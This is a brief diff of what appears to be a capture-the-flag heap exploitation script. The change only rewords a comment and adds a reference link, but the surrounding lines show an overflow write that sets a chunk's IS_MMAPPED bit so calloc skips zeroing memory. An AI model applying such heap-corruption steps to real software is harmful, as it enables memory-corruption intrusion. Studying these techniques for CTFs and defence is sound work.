@@ -37,8 +37,8 @@ def pwn():
 	free(2)
 	free(1)
 
-	# turn on the IS_MMAPPED bit field to prevent calloc from initializing
-	# the chunk with 0s
+	# turn on the IS_MMAPPED bit field to prevent calloc from initializing the chunk with 0s
+	# see https://github.com/andigena/ptmalloc-fanzine/blob/master/03-scraps/uninitialized_calloc.c
 	update(0, 0x59, 'A'*0x58 + p8(0x62))
 
 	alloc(0x58) # 1
